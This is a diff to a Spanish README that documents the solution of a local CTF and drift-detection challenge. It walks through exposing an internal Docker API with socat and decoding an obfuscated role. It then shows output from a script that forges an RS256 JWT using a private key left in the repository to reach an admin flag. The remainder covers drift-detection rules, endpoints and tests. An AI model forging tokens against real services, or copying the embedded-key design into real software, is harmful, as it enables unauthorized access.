@@ -201,4 +201,292 @@ Sigue estos pasos en el orden indicado para completar el desafío. Cada paso con
    - Despliegue en la nube con instrucciones de acceso.
    - Mejoras de seguridad (CORS, rate-limiting, auditoría de logs).
 
-**¡Mucho éxito!** 
+**¡Mucho éxito!**
+
+---
+
+---
+
+## Solución Implementada
+
+### Resumen de entregables
+
+| Requisito | Estado |
+|-----------|--------|
+| CTF: exponer API, forjar JWT, capturar flag | ✅ `FLAG{congrats_you_made_it}` |
+| Módulo de drift detection (≥ 3 reglas) | ✅ 4 reglas implementadas |
+| `POST /resources/ingest` | ✅ |
+| `GET /drifts/summary` | ✅ |
+| Pruebas unitarias e integración | ✅ 34 tests, 0 fallos |
+| `docs/approach.md` | ✅ |
+| `docs/api.md` | ✅ |
+| `docker-compose up --build` | ✅ |
+
+---
+
+### Requisitos previos
+
+- Docker y Docker Compose
+- Python 3.11+ (solo para correr el exploit y los tests fuera del contenedor)
+
+```bash
+pip install pyjwt cryptography requests pytest pytest-flask psycopg2-binary
+```
+
+---
+
+### 1. Levantar el entorno
+
+```bash
+docker-compose up --build -d
+```
+
+Tres servicios arrancan en la red interna `challenge-python_internal`:
+
+| Servicio | Imagen | Rol |
+|----------|--------|-----|
+| `app` | Python 3.11 + gunicorn | API Flask |
+| `db` | PostgreSQL 14 | Usuarios, recursos, drifts |
+| `redis` | Redis 6 | Caché disponible |
+
+> **Nota**: No hay puertos publicados al host por diseño del CTF.
+
+---
+
+### 2. Exponer la API al host (proxy socat)
+
+Para interactuar con la API desde el host se levanta un contenedor proxy en la misma red interna:
+
+```bash
+docker run -d --name proxy \
+  --network challenge-python_internal \
+  -p 5000:5000 \
+  alpine/socat \
+  TCP-LISTEN:5000,fork TCP:app:5000
+```
+
+Verificar conectividad:
+
+```bash
+curl http://localhost:5000/status
+```
+
+```json
+{"status": "ok"}
+```
+
+Listar usuarios:
+
+```bash
+curl http://localhost:5000/users
+```
+
+```json
+{"users": ["alice", "bob", "admin"]}
+```
+
+---
+
+### 3. CTF — Captura de la flag
+
+El script automatiza los 6 pasos del exploit:
+
+```bash
+python scripts/ctf_exploit.py
+```
+
+```
+============================================================
+  CTF Exploit — challenge-python
+  Objetivo: capturar FLAG{...} en /admin/flag
+============================================================
+
+[1] Verificando conectividad con http://localhost:5000/status ...
+    OK — API accesible: {'status': 'ok'}
+
+[2] Descubriendo usuarios en http://localhost:5000/users ...
+    Usuarios encontrados: ['alice', 'bob', 'admin']
+
+[3] Analizando rol requerido desde lógica de main.py ...
+    CAMPAING env var : '=MWZzRWdvx2Y'
+    Invertida        : 'Y2xvdWRzZWM='
+    Base64 decode    : 'cloudsec'
+    Rol requerido    : 'cloudsec'
+
+[4] Identificando usuario con rol 'cloudsec' ...
+    Usuario objetivo : 'bob' (role='cloudsec' confirmado en init.sql)
+
+[5] Forjando JWT RS256 para user='bob', role='cloudsec' ...
+    JWT generado : eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
+
+[6] Capturando flag en http://localhost:5000/admin/flag ...
+
+============================================================
+  FLAG CAPTURADA: 🎉 FLAG{congrats_you_made_it}
+  Mensaje       : ¡Bien hecho! Descubriste el acceso correcto.
+============================================================
+```
+
+**Lógica del exploit:**
+
+| Paso | Técnica |
+|------|---------|
+| Exposición de red | Contenedor socat en red `internal` redirige al host |
+| Descubrimiento | `GET /users` lista usuarios de la BD |
+| Análisis estático | `CAMPAING = "=MWZzRWdvx2Y"` → invertir → base64 decode → `"cloudsec"` |
+| Usuario objetivo | `bob` es el único con `role = "cloudsec"` en `init.sql` |
+| Forja de JWT | Clave privada RSA disponible en `app/keys/private_key.pem` |
+| Flag | `FLAG{congrats_you_made_it}` |
+
+---
+
+### 4. Drift Detection
+
+#### Ingestar el estado actual
+
+```bash
+curl -X POST http://localhost:5000/resources/ingest \
+  -H "Content-Type: application/json" \
+  -d @data/current.json
+```
+
+```json
+{
+  "processed": 2,
+  "drifts_detected": 4,
+  "drifts": [
+    {
+      "resource_id": "vm-001",
+      "type": "VM",
+      "description": "Instance type changed from t2.micro to t2.large",
+      "severity": "High"
+    },
+    {
+      "resource_id": "vm-001",
+      "type": "VM",
+      "description": "Security rule added: tcp/22 from 0.0.0.0/0",
+      "severity": "Critical"
+    },
+    {
+      "resource_id": "vm-001",
+      "type": "VM",
+      "description": "Tag 'owner' missing",
+      "severity": "Medium"
+    },
+    {
+      "resource_id": "lb-001",
+      "type": "LoadBalancer",
+      "description": "Listener added: HTTPS/443",
+      "severity": "Low"
+    }
+  ]
+}
+```
+
+#### Consultar resumen de drifts
+
+```bash
+curl http://localhost:5000/drifts/summary
+```
+
+```json
+{
+  "by_type": {"VM": 3, "LoadBalancer": 1},
+  "by_severity": {"Critical": 1, "High": 1, "Medium": 1, "Low": 1},
+  "total": 4
+}
+```
+
+#### Reglas implementadas
+
+| # | Regla | Tipo | Severidad |
+|---|-------|------|-----------|
+| 1 | Cambio de `instance_type` | VM | `High` |
+| 2 | Regla de security group agregada | VM | `Critical` |
+| 2 | Regla de security group eliminada | VM | `High` |
+| 3 | Tag faltante o con valor incorrecto | Todos | `Medium` |
+| 4 | Listener de LoadBalancer agregado | LoadBalancer | `Low` |
+| 4 | Listener de LoadBalancer eliminado | LoadBalancer | `High` |
+
+---
+
+### 5. Pruebas
+
+```bash
+pytest -v
+```
+
+```
+tests/test_configs.py::test_no_drift_identical_resources PASSED
+tests/test_configs.py::test_instance_type_drift PASSED
+tests/test_configs.py::test_security_rule_added PASSED
+tests/test_configs.py::test_security_rule_removed PASSED
+tests/test_configs.py::test_tag_missing PASSED
+tests/test_configs.py::test_tag_value_changed PASSED
+tests/test_configs.py::test_listener_added PASSED
+tests/test_configs.py::test_listener_removed PASSED
+tests/test_configs.py::test_new_resource_no_baseline PASSED
+tests/test_configs.py::test_missing_resource_in_current PASSED
+tests/test_configs.py::test_multiple_drifts_same_resource PASSED
+tests/test_configs.py::test_compare_resources_sample_data PASSED
+tests/test_jwt.py::test_valid_jwt_grants_access PASSED
+tests/test_jwt.py::test_invalid_signature_rejected PASSED
+tests/test_jwt.py::test_wrong_algorithm_rejected PASSED
+tests/test_jwt.py::test_expired_token_rejected PASSED
+tests/test_jwt.py::test_missing_role_claim PASSED
+tests/test_jwt.py::test_missing_user_claim PASSED
+tests/test_api.py::test_status_ok PASSED
+... (16 tests de API)
+
+34 passed in X.XXs
+```
+
+**Cobertura por módulo:**
+
+| Archivo de tests | Módulo cubierto | Tests |
+|-----------------|-----------------|-------|
+| `test_configs.py` | `drift_detector.py` — 4 reglas de negocio | 12 |
+| `test_jwt.py` | `main.py` — autenticación RS256 | 6 |
+| `test_api.py` | `main.py` — todos los endpoints | 16 |
+
+---
+
+### 6. Estructura del proyecto
+
+```
+challenge-python/
+├── app/
+│   ├── Dockerfile
+│   ├── main.py              # API Flask (5 endpoints)
+│   ├── drift_detector.py    # Motor de drift detection
+│   ├── requirements.txt
+│   └── keys/
+│       ├── private_key.pem  # Firma JWT (RS256)
+│       └── public_key.pem   # Verificación JWT
+├── data/
+│   ├── baseline.json        # Configuración base (seed)
+│   └── current.json         # Estado actual (input de ingest)
+├── db/
+│   └── init.sql             # Esquema + usuarios iniciales
+├── docs/
+│   ├── approach.md          # Enfoque técnico detallado
+│   └── api.md               # Documentación de endpoints
+├── scripts/
+│   └── ctf_exploit.py       # Exploit automatizado (6 pasos)
+├── tests/
+│   ├── conftest.py          # Fixtures y mocks
+│   ├── test_configs.py      # Tests unitarios drift engine
+│   ├── test_jwt.py          # Tests de autenticación JWT
+│   └── test_api.py          # Tests de integración API
+├── docker-compose.yml
+└── pytest.ini
+```
+
+---
+
+### 7. Limpieza
+
+```bash
+docker-compose down
+docker rm -f proxy
+```
